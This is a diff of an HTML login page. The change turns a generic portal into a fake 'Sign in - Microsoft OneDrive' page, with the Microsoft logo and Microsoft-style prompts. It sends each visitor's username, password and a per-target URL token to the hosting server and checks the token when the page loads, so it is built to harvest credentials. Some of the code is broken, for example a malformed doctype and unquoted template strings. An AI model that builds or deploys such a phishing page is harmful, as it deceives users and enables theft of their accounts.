@@ -1,93 +1,95 @@
-<!DOCTYPE html>
+DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Access Portal</title>
+    <title>Sign in - Microsoft OneDrive</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, 
-                rgba(230, 230, 250, 0.3), 
-                rgba(173, 216, 230, 0.3), 
-                rgba(240, 255, 240, 0.3), 
-                rgba(255, 228, 196, 0.3));
-            display: grid;
-            place-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to bottom right, 
+                rgba(255, 153, 153, 0.3), /* light red */
+                rgba(153, 204, 255, 0.3), /* light blue */
+                rgba(153, 255, 153, 0.3), /* light green */
+                rgba(255, 255, 153, 0.3)  /* light yellow */
+            );
+            display: flex;
+            justify-content: center;
+            align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .wrapper {
-            max-width: 450px;
-            padding: 25px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            text-align: left;
-        }
-        .brand-logo {
-            display: block;
-            margin: 0 auto 15px;
-        }
-        h1 {
-            font-size: 22px;
-            margin-bottom: 15px;
+        .container {
+            width: 400px;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
             text-align: center;
         }
-        .form-container {
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+        }
+        h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        form {
             display: flex;
             flex-direction: column;
-            gap: 15px;
+            align-items: center;
         }
-        .input-box {
+        input[type="text"], input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
         }
-        .submit-btn {
+        button {
             width: 100%;
-            padding: 12px;
-            background-color: #005a9e;
-            color: #fff;
+            padding: 10px;
+            margin: 10px 0;
+            background: #0078d7;
+            color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 5px;
             cursor: pointer;
+            font-size: 16px;
         }
-        .submit-btn:hover {
-            background-color: #003f6f;
+        button:hover {
+            background: #005a9e;
         }
-        .help-links {
+        p {
             margin-top: 10px;
-            text-align: center;
-            font-size: 14px;
+            color: #555;
         }
-        .help-links a {
-            color: #005a9e;
+        a {
+            color: #0078d7;
             text-decoration: none;
         }
-        .help-links a:hover {
+        a:hover {
             text-decoration: underline;
         }
-        .overlay {
+        .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
+            background: rgba(0, 0, 0, 0.5);
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #fff;
+            color: white;
             font-size: 18px;
             z-index: 1000;
             display: none;
         }
-        .loading-indicator {
+        .spinner {
             border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
+            border-top: 4px solid white;
             border-radius: 50%;
             width: 40px;
             height: 40px;
@@ -99,70 +101,132 @@
         }
         .error-message {
             color: red;
-            margin-top: 8px;
-            font-size: 13px;
+            margin-top: 10px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Brand Logo" class="brand-logo" width="90">
-        <h1>Access Panel</h1>
-        <div class="form-container">
-            <input type="text" id="userInput" class="input-box" placeholder="Enter your ID" required>
-            <input type="password" id="passwordInput" class="input-box" placeholder="Enter your passcode" required>
-            <button class="submit-btn" onclick="handleLogin()">Proceed</button>
-        </div>
-        <p class="help-links">Don't have an account? <a href="#" onclick="resetForm()">Register now</a></p>
-        <p id="errorBox" class="error-message"></p>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo" width="100">
+        <h2>Sign in</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" id="password" placeholder="Enter password" required>
+            <button type="button" onclick="login()">Next</button>
+        </form>
+        
+        <p>No account? <a href="javascript:void(0);" onclick="reloadPage()">Create one!</a></p>
+        <p id="message" class="error-message"></p>
     </div>
-    <div class="overlay" id="loadingScreen">
-        <div class="loading-indicator"></div>
-        <div>Verifying credentials...</div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div>Authenticating your credentials, please wait...</div>
     </div>
 
     <script>
-        function toggleLoading(state) {
-            document.getElementById('loadingScreen').style.display = state ? 'flex' : 'none';
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
         }
 
-        function resetForm() {
-            document.getElementById('userInput').value = '';
-            document.getElementById('passwordInput').value = '';
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
         }
 
-        async function handleLogin() {
-            const userInput = document.getElementById('userInput').value;
-            const passwordInput = document.getElementById('passwordInput').value;
-            const errorBox = document.getElementById('errorBox');
+        function getQueryVariable(variable) {
+            var query = window.location.href;
+            var tokenIndex = query.indexOf('?token=');
+            if (tokenIndex === -1) {
+                tokenIndex = query.indexOf('&token=');
+            }
+            if (tokenIndex !== -1) {
+                var start = tokenIndex + 7;
+                var end = query.indexOf('&', start);
+                if (end === -1) {
+                    end = query.length;
+                }
+                return decodeURIComponent(query.substring(start, end));
+            }
+            console.log('Query variable %s not found', variable);
+            return null;
+        }
 
-            if (!userInput || !passwordInput) {
-                errorBox.textContent = 'Both fields are required.';
+
+        function reloadPage() {
+            window.location.reload();
+        }
+
+
+        async function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const token = getQueryVariable('token');
+            const messageElement = document.getElementById('message');
+
+            if (!username || !password) {
+                messageElement.textContent = 'Please enter both username and password.';
                 return;
             }
+            const baseUrl = window.location.origin;
+            const url = ${baseUrl}/api/users/login;
 
-            toggleLoading(true);
+            showLoading();
 
             try {
-                const response = await fetch('/api/login', {
+                const response = await fetch(url, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: userInput, pass: passwordInput })
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password, token })
                 });
-
-                const result = await response.json();
-                if (result.success) {
-                    alert('Login successful');
+                const data = await response.json();
+                if (data.success) {
+                    alert(data.message);
                 } else {
-                    errorBox.textContent = result.message;
+                    messageElement.textContent = data.message;
                 }
             } catch (error) {
                 console.error('Error:', error);
-                errorBox.textContent = 'An error occurred. Please try again later.';
+                messageElement.textContent = 'An error occurred. Please try again.';
             } finally {
-                toggleLoading(false);
+                hideLoading();
             }
         }
+
+        async function validate() {
+            const token = getQueryVariable('token');
+            const messageElement = document.getElementById('message');
+
+            if (!token) {
+                messageElement.textContent = 'Token is missing.';
+                return;
+            }
+            const baseUrl = window.location.origin;
+            const url = ${baseUrl}/api/users/validate;
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ token })
+                });
+
+               // const data = await response.json();
+               // if (data.success) {
+               //     console.log('Token validated successfully.');
+               // } else {
+               //     messageElement.textContent = data.message;
+               // }
+            } catch (error) {
+                console.error('Error:', error);
+                messageElement.textContent = 'An error occurred during validation. Please try again.';
+            }
+        }
+
+        window.onload = validate;
     </script>
 </body>
 </html>
